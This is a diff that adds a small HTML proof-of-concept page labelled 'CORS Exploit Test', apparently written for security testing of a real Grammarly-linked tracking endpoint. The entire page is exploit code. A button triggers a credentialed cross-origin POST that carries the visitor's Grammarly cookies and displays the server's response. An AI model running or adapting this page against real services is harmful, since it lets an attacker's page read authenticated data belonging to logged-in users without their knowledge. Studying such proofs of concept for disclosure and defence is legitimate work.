@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>CORS Exploit Test</h2>
+    <button onclick="exploit()">Exploit</button>
+    <pre id="output">Click to run CORS request</pre>
+
+    <script>
+      function exploit() {
+        fetch("https://grammarly.pxf.io/xc/6125099/2751037/31551", {
+          method: "POST",
+          credentials: "include", // Sends Grammarly cookies
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
+          },
+          body: "customProfileId=test123&_ir=test"
+        })
+        .then(response => response.text())
+        .then(data => {
+          document.getElementById("output").textContent = "Success:\n" + data;
+        })
+        .catch(error => {
+          document.getElementById("output").textContent = "Error:\n" + error;
+        });
+      }
+    </script>
+  </body>
+</html>
